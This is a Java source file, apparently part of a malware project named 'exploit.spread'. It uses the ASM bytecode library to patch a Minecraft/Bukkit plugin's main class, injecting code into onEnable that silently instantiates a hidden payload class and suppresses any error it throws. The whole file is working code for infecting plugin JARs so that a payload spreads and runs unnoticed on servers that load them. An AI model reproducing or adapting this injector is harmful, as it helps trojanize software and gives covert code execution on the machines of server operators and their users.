package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import org.objectweb.asm.*;

import java.nio.file.FileSystem;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

public final class MainClassPatcher {

    public static void hook(FileSystem outStream, String mainClass, String finalPayloadFQN) throws Exception {
        Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (ASM): Starting main class hook process.");

        String mainClassPathStr = mainClass.replace('.', '/') + ".class";
        Path mainClassPath = outStream.getPath(mainClassPathStr);

        if (!Files.exists(mainClassPath)) {
            Exploit.sender.sendDebug(Level.SEVERE, "  |-> Main class file not found at: " + mainClassPath);
            return;
        }

        Exploit.sender.sendDebug(Level.INFO, "  |-> Reading class file: " + mainClassPath);
        byte[] classBytes = Files.readAllBytes(mainClassPath);

        ClassReader classReader = new ClassReader(classBytes);
        ClassWriter classWriter = new ClassWriter(classReader, ClassWriter.COMPUTE_FRAMES);

        ClassVisitor classVisitor = new OnEnableMethodClassVisitor(classWriter, finalPayloadFQN);
        classReader.accept(classVisitor, ClassReader.EXPAND_FRAMES);

        Exploit.sender.sendDebug(Level.INFO, "  |-> Writing modified main class back to: " + mainClassPath);
        Files.write(mainClassPath, classWriter.toByteArray(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
        Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (ASM): Hooking process complete.");
    }

    private static class OnEnableMethodClassVisitor extends ClassVisitor {
        private final String finalPayloadInternalName;

        public OnEnableMethodClassVisitor(ClassVisitor classVisitor, String finalPayloadFQN) {
            super(Opcodes.ASM9, classVisitor);
            this.finalPayloadInternalName = finalPayloadFQN.replace('.', '/');
        }

        @Override
        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
            if (mv != null && "onEnable".equals(name) && "()V".equals(descriptor)) {
                Exploit.sender.sendDebug(Level.INFO, "  |-> Found 'onEnable' method. Applying stealth hook.");
                return new OnEnableMethodVisitor(mv, finalPayloadInternalName);
            }
            return mv;
        }
    }

    private static class OnEnableMethodVisitor extends MethodVisitor {
        private final String finalPayloadInternalName;

        public OnEnableMethodVisitor(MethodVisitor methodVisitor, String finalPayloadInternalName) {
            super(Opcodes.ASM9, methodVisitor);
            this.finalPayloadInternalName = finalPayloadInternalName;
        }

        @Override
        public void visitInsn(int opcode) {
            if (opcode >= Opcodes.IRETURN && opcode <= Opcodes.RETURN) {
                Exploit.sender.sendDebug(Level.INFO, "  |-> Injecting silent payload instantiation code before RETURN instruction.");

                Label tryStart = new Label();
                Label tryEnd = new Label();
                Label catchHandler = new Label();
                Label exitPoint = new Label();

                super.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Throwable");

                super.visitLabel(tryStart);
                String pluginDescriptor = "Lorg/bukkit/plugin/Plugin;";
                String constructorDescriptor = "(" + pluginDescriptor + ")V";
                super.visitTypeInsn(Opcodes.NEW, finalPayloadInternalName);
                super.visitInsn(Opcodes.DUP);
                super.visitVarInsn(Opcodes.ALOAD, 0);
                super.visitMethodInsn(Opcodes.INVOKESPECIAL, finalPayloadInternalName, "<init>", constructorDescriptor, false);
                super.visitInsn(Opcodes.POP);
                super.visitLabel(tryEnd);

                super.visitJumpInsn(Opcodes.GOTO, exitPoint);

                super.visitLabel(catchHandler);
                super.visitInsn(Opcodes.POP);

                super.visitLabel(exitPoint);
            }
            super.visitInsn(opcode);
        }
    }
}